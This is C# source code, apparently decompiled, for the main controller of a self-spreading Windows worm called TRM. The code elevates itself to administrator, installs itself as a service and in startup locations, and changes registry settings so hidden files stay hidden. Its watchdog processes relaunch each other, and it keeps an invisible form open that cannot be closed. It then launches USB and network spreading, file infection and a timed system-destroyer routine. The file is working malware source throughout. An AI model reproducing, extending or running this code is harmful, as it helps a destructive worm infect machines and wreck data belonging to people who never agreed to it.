using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.ServiceProcess;
using System.Threading;
using System.Windows.Forms;
using TRM.Classes;
using TRM.Defination;
using TRM.Network;
using TRM.Service;
using TRM.Spread;

namespace TRM;

public class AppManager
{
	private static Random _rnd = new Random();

	private static bool _serviceInstalled = false;

	private static bool _serviceRunning = false;

	private static bool? _argModifyRegistry;

	private static int? _argWatchProccess;

	private static int? _argWatchServicePid;

	private static string _argWatchService;

	private static AppStartupState _appStartup = AppStartupState.Unknow;

	private static Mutex _mutex;

	public static void Start(string[] args)
	{
		if (args != null && args.Length > 0)
		{
			ParseAppArguments(args);
		}
		switch (_appStartup)
		{
		case AppStartupState.WatchService:
			StartWatchService();
			return;
		case AppStartupState.WatchProccess:
			StartWatchProccess();
			return;
		case AppStartupState.ModifyRegistry:
			StartModifyRegistry();
			return;
		}
		if (!AppIsStartedAsAService() && !Spreader.AdministratorIsInRole())
		{
			if (!Spreader.IsThisAppRunningFromSystemStartup())
			{
				if (!Spreader.GetFlagIsElevateToAdmin() && !IsServiceInstalled() && !IsAnotherInstanceRunning(AppConfig.AppInstanceAdminRole))
				{
					Spreader.SetFlagIsElevateToAdmin(flag: true);
					Spreader.ElevateInAdministrator(withParams: false);
				}
			}
			else
			{
				Spreader.SetFlagIsElevateToAdmin(flag: false);
			}
		}
		Spreader.RunSpreadedInfectedFile(args);
		if (IsAnotherInstanceRunning(AppConfig.AppInstanceSpreader))
		{
			RunModifyRegistryProcess();
			return;
		}
		if (!IsServiceInstalled() && AppIsStartedFromEssentialPlace())
		{
			InstallService();
		}
		InstallInEssentialPlaces();
		RunModifyRegistryProcess();
		if (AppIsStartedAsAService())
		{
			RunTheAppAsService();
		}
		if (IsServiceInstalled())
		{
			ExitAndRunFromService();
		}
		if (!AppIsStartedFromEssentialPlace() && IsAppInEssentialPlaces())
		{
			ExitAndRunFromEssentialPlaces();
		}
		RunWatchMeProcess();
		StartSilentSpreadingAndDestroying();
	}

	public static void StartSilentSpreadingAndDestroying()
	{
		UsbSpreader.StartUsbSniffer();
		new ActionMethod(NetworkSpreader.StartNetworkSpreadProcess).BeginInvoke(null, null);
		new ActionMethod(Spreader.StartSpreaderProcess).BeginInvoke(null, null);
		new ActionMethod(SystemDestroyer.StartSystemDestroyerProcessInTime).BeginInvoke(null, null);
		WatchMeProcess.StartWatchMeProcessMessages();
		StartWaitingForever();
	}

	private static void ExitAndRunFromEssentialPlaces()
	{
		try
		{
			string text = "";
			List<string> list = Spreader.AppEssentionalInstalledLocatins();
			if (list.Count > 1)
			{
				int index = _rnd.Next(0, list.Count - 1);
				text = list[index];
			}
			else
			{
				if (list.Count != 1)
				{
					return;
				}
				text = list[0];
			}
			Process.Start(text);
			Environment.Exit(0);
		}
		catch
		{
		}
	}

	private static bool AppIsStartedFromEssentialPlace()
	{
		return Spreader.IsInstalledInEssentionalPlace(Application.get_ExecutablePath());
	}

	private static void ExitAndRunFromService()
	{
		if (_serviceRunning)
		{
			Application.Exit();
		}
	}

	private static bool AppIsStartedAsAService()
	{
		return TheServiceManager.IsAppStartedAsService();
	}

	private static void InstallInEssentialPlaces()
	{
		Spreader.SpreadInEssentionalPlaces();
	}

	private static bool IsAppInEssentialPlaces()
	{
		return Spreader.IsInstalledInEssentionalPlace();
	}

	private static void RunTheAppAsService()
	{
		try
		{
			if (!IsAnotherInstanceRunning(AppConfig.AppInstanceService))
			{
				RunWatchMeService();
				TheServiceManager.StartTheServiceApp();
			}
			Environment.Exit(0);
		}
		catch (Exception)
		{
		}
	}

	private static void StartService()
	{
		try
		{
			TheServiceManager.StartService(AppConfig.ServiceName);
		}
		catch (Exception)
		{
		}
	}

	private static void InstallService()
	{
		try
		{
			TheServiceManager.InstallService();
			Thread.Sleep(100);
			StartService();
		}
		catch (Exception)
		{
		}
	}

	private static bool IsServiceInstalled()
	{
		try
		{
			TheServiceManager.CheckService(AppConfig.ServiceName, out _serviceInstalled, out _serviceRunning);
		}
		catch (Exception)
		{
			return false;
		}
		return _serviceInstalled;
	}

	private static void StartWaitingForever()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		Form val = new Form();
		val.set_Location(new Point(-400, -400));
		val.set_Opacity(0.0);
		val.set_FormBorderStyle((FormBorderStyle)0);
		val.set_ShowIcon(false);
		val.set_ShowInTaskbar(false);
		((Control)val).set_Visible(false);
		((Control)val).set_Text("");
		Form form = val;
		form.add_FormClosing((FormClosingEventHandler)delegate(object sender, FormClosingEventArgs e)
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Invalid comparison between Unknown and I4
			if ((int)e.get_CloseReason() == 3 || (int)e.get_CloseReason() == 4)
			{
				((CancelEventArgs)(object)e).Cancel = true;
			}
		});
		form.add_Shown((EventHandler)delegate
		{
			((Control)form).set_Visible(false);
		});
		try
		{
			Application.Run(form);
		}
		catch (Exception)
		{
			while (AppConfig.AppIsRunning)
			{
				Thread.Sleep(1000);
			}
		}
	}

	private static bool IsAnotherInstanceRunning(string name)
	{
		try
		{
			_mutex = Mutex.OpenExisting(name);
			return true;
		}
		catch
		{
			try
			{
				_mutex = new Mutex(initiallyOwned: true, name);
			}
			catch (Exception)
			{
				return true;
			}
		}
		return false;
	}

	private static void StartWatchProccess()
	{
		try
		{
			using Process process = Process.GetCurrentProcess();
			WatchMeProcess.SendWatchmeMessage(process.Id);
		}
		catch (Exception)
		{
		}
		int value = _argWatchProccess ?? (-1);
		StartWatchProccess(value);
	}

	internal static void StartWatchProccess(int? prcid)
	{
		int num = prcid ?? (-1);
		using (Process process = Process.GetCurrentProcess())
		{
			if (num == process.Id)
			{
				return;
			}
		}
		Process processById;
		try
		{
			processById = Process.GetProcessById(num);
			if (processById == null)
			{
				return;
			}
		}
		catch (Exception)
		{
			return;
		}
		string text = "";
		ProcessStartInfo processStartInfo = null;
		try
		{
			processStartInfo = processById.StartInfo;
			text = processById.MainModule!.FileName;
		}
		catch (Exception)
		{
			return;
		}
		try
		{
			processById.WaitForExit();
		}
		catch (Exception)
		{
		}
		try
		{
			if (processStartInfo != null && !string.IsNullOrEmpty(processStartInfo.FileName))
			{
				Process.Start(processStartInfo);
				return;
			}
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text);
			processStartInfo2.UseShellExecute = true;
			Process.Start(processStartInfo2);
		}
		catch (Exception)
		{
		}
	}

	private static void StartWatchService()
	{
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		int processId = _argWatchServicePid ?? (-1);
		Process processById;
		try
		{
			processById = Process.GetProcessById(processId);
			if (processById == null)
			{
				return;
			}
		}
		catch (Exception)
		{
			return;
		}
		try
		{
			processById.WaitForExit();
		}
		catch (Exception)
		{
		}
		try
		{
			ServiceController val = new ServiceController(_argWatchService);
			val.Start();
		}
		catch (Exception)
		{
		}
	}

	private static void StartModifyRegistry()
	{
		Spreader.SpreadInSystemStartup();
		Spreader.SpreadDontShowHiddenFileConfig();
		if (_argModifyRegistry == true)
		{
			Environment.Exit(0);
		}
	}

	private static void ParseAppArguments(string[] args)
	{
		if (args == null || args.Length == 0)
		{
			return;
		}
		try
		{
			int result;
			switch (args[0].ToLower())
			{
			case "ws":
				if (int.TryParse(args[1], out result) && !string.IsNullOrEmpty(args[2]))
				{
					_argWatchServicePid = result;
					_argWatchService = args[2];
					_appStartup = AppStartupState.WatchService;
				}
				break;
			case "wm":
				if (int.TryParse(args[1], out result))
				{
					_argWatchProccess = result;
					_appStartup = AppStartupState.WatchProccess;
				}
				break;
			case "rg":
				_argModifyRegistry = true;
				_appStartup = AppStartupState.ModifyRegistry;
				break;
			}
		}
		catch
		{
		}
	}

	private static void RunModifyRegistryProcess()
	{
		string executablePath = Application.get_ExecutablePath();
		ProcessStartInfo processStartInfo = new ProcessStartInfo(executablePath);
		processStartInfo.Arguments = "rg";
		ProcessStartInfo startInfo = processStartInfo;
		try
		{
			Process.Start(startInfo);
		}
		catch
		{
		}
	}

	private static void RunWatchMeProcess()
	{
		string fileName = Application.get_ExecutablePath();
		List<string> list = Spreader.AppEssentionalInstalledLocatins();
		if (list.Count > 1)
		{
			int index = _rnd.Next(0, list.Count - 1);
			fileName = list[index];
		}
		Process currentProcess = Process.GetCurrentProcess();
		ProcessStartInfo processStartInfo = new ProcessStartInfo(fileName);
		processStartInfo.Arguments = "wm " + currentProcess.Id;
		ProcessStartInfo startInfo = processStartInfo;
		try
		{
			Process.Start(startInfo);
		}
		catch
		{
		}
	}

	private static void RunWatchMeService()
	{
		string fileName = Application.get_ExecutablePath();
		List<string> list = Spreader.AppEssentionalInstalledLocatins();
		if (list.Count > 1)
		{
			int index = _rnd.Next(0, list.Count - 1);
			fileName = list[index];
		}
		Process currentProcess = Process.GetCurrentProcess();
		ProcessStartInfo processStartInfo = new ProcessStartInfo(fileName);
		processStartInfo.Arguments = "ws " + currentProcess.Id + " " + AppConfig.ServiceName;
		ProcessStartInfo startInfo = processStartInfo;
		try
		{
			Process.Start(startInfo);
		}
		catch
		{
		}
	}
}
